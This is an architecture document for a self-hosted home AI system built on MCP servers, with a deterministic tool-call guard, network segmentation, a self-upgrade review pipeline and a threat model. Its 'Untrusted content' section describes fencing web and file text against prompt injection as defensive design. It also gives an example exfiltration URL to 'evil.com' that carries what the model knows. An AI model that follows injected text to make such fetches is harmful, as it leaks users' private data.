# Tau-Kai Architecture

## Core Design Philosophy

**Tau** is a self-hosted, Proxmox-native home AI system built on the **Model Context Protocol (MCP)**. The architecture prioritizes:

- **Compartmentalization**: Each capability is an isolated MCP server; a compromised server cannot access other domains
- **Auditability**: Every tool call is logged, typed, and reviewable (critical for self-upgrade governance)
- **Extensibility**: Adding support for new devices = standing up a new MCP server with scoped permissions

---

## System Architecture

### High-Level Overview

```
                     ┌─────────────────────────────┐
                     │        TAU CORE (Host)       │
                     │  Orchestrator + LLM runtime  │
                     │  (Ollama, local models)      │
                     │  Core Directive Guard (CDG)  │
                     └───────────┬─────────────────┘
                                 │  MCP Client(s)
        ┌───────────┬───────────┼───────────┬─────────────┬─────────────┐
        │           │           │           │             │             │
  ┌─────▼────┐ ┌────▼─────┐┌────▼─────┐┌────▼──────┐┌─────▼──────┐┌─────▼──────┐
  │ proxmox- │ │  home-   ││  vision- ││ security- ││ fabrication││ robotics-  │
  │ mcp-svr  │ │ assistant││  mcp-svr ││  mcp-svr  ││  mcp-svr   ││  mcp-svr   │
  │          │ │ mcp-svr  ││ (cams,   ││ (lockdown,││ (3D        ││ (drone,    │
  │ VMs/LXC, │ │ (IoT,    ││ face/    ││ intrusion,││ printers)  ││ robot dog) │
  │ CVE watch│ │ lights,  ││ voice ID)││ patrol)   ││            ││  Phase 5   │
  │          │ │ sensors) ││          ││           ││            ││            │
  └──────────┘ └──────────┘└──────────┘└───────────┘└────────────┘└────────────┘
        │
  ┌─────▼──────────┐   ┌──────────────┐   ┌───────────────┐
  │ voice-mcp-svr   │   │ memory-mcp   │   │ ui-bridge-mcp │
  │ (Piper TTS,     │   │ (vector DB:  │   │ (3D atom UI,  │
  │  Whisper STT)   │   │ faces/voices/│   │  camera pane, │
  │                 │   │  project ctx)│   │  HA dashboard)│
  └─────────────────┘   └──────────────┘   └───────────────┘
```

### Core Directive Guard (CDG)

The **CDG** is a deterministic middleware layer that:

- Sits between the LLM and tool execution (cannot be bypassed by prompt injection)
- Maintains hard-coded rulesets enforcing non-negotiable constraints:
  - Never shut down safety-critical systems without explicit signed user approval
  - Enforce domain isolation (e.g., 3D-printer server cannot query face data)
  - Block dangerous operations during lockdown mode
- Vetoes any tool call regardless of what the LLM argues for
- **CDG ruleset itself is immutable** — changes require manual out-of-band edits only

### MCP Server Patterns

Each domain server implements:

- **Tools**: Scoped, typed actions (e.g., `call_service` for Home Assistant)
- **Resources**: Readable state exposed to Tau for reasoning (e.g., live device states)
- **Prompts**: Reusable instructions for LLM behavior within that domain

**Transport**:
- **Stdio** for local processes (Proxmox server, voice TTS/STT)
- **Streamable HTTP/SSE** for networked services (Home Assistant, cameras)

### Network Segmentation (Phase 0)

- **Management VLAN**: Proxmox UI, k3s control plane
- **IoT VLAN**: Home Assistant, light/sensor endpoints
- **Camera VLAN**: Vision server, PTZ cameras
- **Core Agent VLAN**: Tau Core host, approval workflows
- **Secrets VLAN**: Vault (read-only from other servers)

Firewall rules: **Tau Core → MCP servers only** (no lateral movement between server VLANs).

---

## Phase Overview

### Phase 0: Infrastructure Foundation
- Proxmox hardening (2FA, scoped API tokens)
- k3s cluster for MCP server redundancy
- Self-hosted container registry
- Secrets management (Vault / SOPS+age)
- Central observability (Prometheus + Grafana + Loki)
- Ollama LLM runtime (with model selection for tool-calling + fast routing)
- Piper (TTS) + faster-whisper (STT) deployments

### Phase 1: Tau Core (Complete ✓)
- MCP Host implementing client/server protocol
- LLM runtime (Ollama-backed PydanticAI agent)
- Core Directive Guard (deterministic, testable, immutable)
- Session/context manager with long-term memory integration
- Approval workflow primitive for human sign-off
- Confidence-based routing (ask for input vs. act)

### Phase 2: Core MCP Servers (Complete ✓)
1. **proxmox-mcp-server**: VM/LXC lifecycle, CVE monitoring
2. **home-assistant-mcp-server**: IoT device control + state aggregation
3. **voice-mcp-server**: TTS (Piper) + STT (Whisper)
4. **memory-mcp-server**: Embedding store (face/voice recognition)
5. **vision-mcp-server**: Camera feeds, scene understanding, face detection, object tracking
6. **security-mcp-server**: Lockdown mode, intrusion detection, incident logging
7. **fabrication-mcp-server**: 3D printer control (OctoPrint / Moonraker)

### Phase 3: UI Layer
- **ui-bridge-mcp-server**: Aggregates state from voice, HA, vision, security servers
- **Frontend** (React): 3D atom visualization (idle), voice-triggered transition, contextual panels
  - Live transcription overlay
  - Camera feed integration
  - Home Assistant dashboard
  - Approval queue interface
  - E-ink inspired design (high-contrast, monospaced typography)

### Phase 4: Governed Self-Upgrade Pipeline
- Proposal workflow: Tau proposes changes (diffs + rationale) to a queue
- Three-agent review: Security, Quality, Intent reviewers evaluate
- CDG approval: Unanimous OR explicit user override required before merge
- CI/CD integration: Merge triggers GitHub Actions (tests → build → k3s deploy)
- **Immutability**: CDG ruleset never changes through this pipeline

### Phase 5: Robotics & Mobile
- **robotics-mcp-server**: Drone patrol routes, robot-dog telemetry (Phase 5+)
- **Project Archer**: Mobile companion app (Android/iOS PWA or native)
  - Talks to same MCP servers over VPN (Tailscale/WireGuard)
  - Reuses voice + HA + camera/security servers

---

## Tool Call Audit Trail

Every tool call flows through:

1. **LLM** decides which tool to call (via Ollama)
2. **Confidence scorer** rates confidence (separate small model)
3. **CDG** checks ruleset → approves / asks for input / rejects
4. **Approval queue** holds pending human sign-off (if needed)
5. **Execution** runs if approved
6. **Logging**: Call + result + CDG decision written to observability stack (Loki/Prometheus)

Result: **auditability by design** — every decision is traceable and reviewable.

---

## Key Dependencies & Integrations

| Component | Purpose | Type |
|---|---|---|
| **Ollama** | Local LLM runtime | External service |
| **k3s** | Container orchestration (MCP server redundancy) | Infrastructure |
| **Vault** | Secrets management | External service |
| **Prometheus + Grafana + Loki** | Observability & audit trail | External services |
| **Qdrant / Chroma** | Vector DB (embeddings) | External service |
| **Piper** | TTS engine | External service |
| **faster-whisper** | STT engine | External service |
| **Proxmox API** | Infrastructure control | External API |
| **Home Assistant** | IoT hub | External service |
| **OctoPrint / Moonraker** | 3D printer control | External API |
| **CLIP / YOLOv8** | Vision models (scene understanding, object detection) | ML library |
| **insightface** | Face embedding | ML library |
| **speechbrain** | Voice embedding | ML library |
| **Three.js** | 3D frontend rendering | JavaScript library |

---

## Security Model

### Threat Model & Mitigations

| Threat | Mitigation |
|---|---|
| LLM prompt injection | CDG is deterministic middleware (cannot be bypassed) — see "Untrusted content" below |
| Replay of a human approval | Approvals are single-use: redeemed and marked `USED` at the moment they authorise a call |
| Drive-by access from a household browser | CORS restricted to LAN origins, so a public page cannot script a browser into the bridge |
| Lateral movement between servers | Network segmentation (VLAN isolation + firewall rules) |
| SSRF from the research server into the LAN | Post-DNS-resolution address check, re-run on every redirect hop |
| Unauthorized self-upgrade | 3-agent review + unanimous approval OR explicit user override |
| Compromise of one MCP server | Isolation means other domains remain trusted |
| Unauthorized access to embeddings | VLAN isolation + encryption at rest + CDG scoping rules |
| Absence of audit trail | All tool calls logged to Loki; searchable + immutable |
| Known-vulnerable dependencies | `pip-audit` + `bandit` + `npm audit` run on every push (CI) |

### Untrusted content

Two channels carry text into the model's prompt that neither Tau nor the user wrote, and both are
fenced with an explicit marker pair plus instructions that the span is data:

| Channel | Fence | Implemented in |
|---|---|---|
| Web pages, search results | `<<<UNTRUSTED_WEB_CONTENT>>>` | `research_mcp_server.server` |
| Attached files, PDFs, image analysis | `<<<UNTRUSTED_FILE_CONTENT>>>` | `tau_core.untrusted` |

Content is scrubbed of *every* fence marker before wrapping, so it cannot close its own fence (or
the other channel's — the two share one prompt string). Attacker-controlled filenames are
flattened to a single line before being printed outside the fence.

**Fencing is a soft mitigation, not a boundary.** It raises the bar and makes an attempt visible
in the reply; it does not stop a sufficiently persuasive injection. The boundary is the CDG: an
injected instruction that reaches a dangerous tool still lands in the approval queue in front of a
human. Nothing downstream should be relaxed because the fences exist.

The residual risk worth stating plainly is exfiltration — `fetch_page` will fetch
`https://evil.com/?q=<what the model knows>`, and no URL filter short of a domain allowlist stops
that. Every fetch is audited with its URL, which makes it detectable, not preventable. The
architectural answer is to scope research to a sub-agent that holds nothing worth stealing.

### Safety Constraints

- **CDG ruleset immutable**: Changes only via manual, out-of-band edits
- **No autonomous safety actions**: Physical/destructive operations require approval
- **Lockdown mode**: Disables non-critical write-tools during security incidents
- **Three-reviewer consensus**: Self-upgrades must pass security, quality, and intent review
- **Encrypted secrets**: No credentials in git; all pulled from Vault at runtime

---

## Extensibility

### Adding a New MCP Server

1. Write the server module (Python/Rust/Go, MCP protocol)
2. Define **Tools** (actions), **Resources** (state), **Prompts** (instructions)
3. Register in `tau-core/config/servers.yaml` (URI + transport type)
4. Add CDG rules in `tau-core/config/cdg_rules.yaml` (which tools require approval)
5. Wire observability logging
6. Deploy to k3s
7. Test end-to-end via tau-core test suite

### Key Design Patterns

- **Read-only tools don't need approval** (e.g., `list_vms`, `get_entity_state`)
- **Write/destructive tools require approval** (e.g., `snapshot_vm`, `restart_service`)
- **Security-sensitive tools always require approval** (e.g., `enter_lockdown`, `call_security_service`)
- **Confidence-based routing**: tools with low confidence ask for input; high confidence auto-execute (within CDG rules)

---

## References

- [Project Plan](project-tau-plan.md) — Full build timeline and phase details
- [Integrations & Roadmap](INTEGRATIONS.md) — Upcoming integrations and design ideas
- [Design Decisions](DESIGN_DECISIONS.md) — Why MCP, why CDG, why k3s
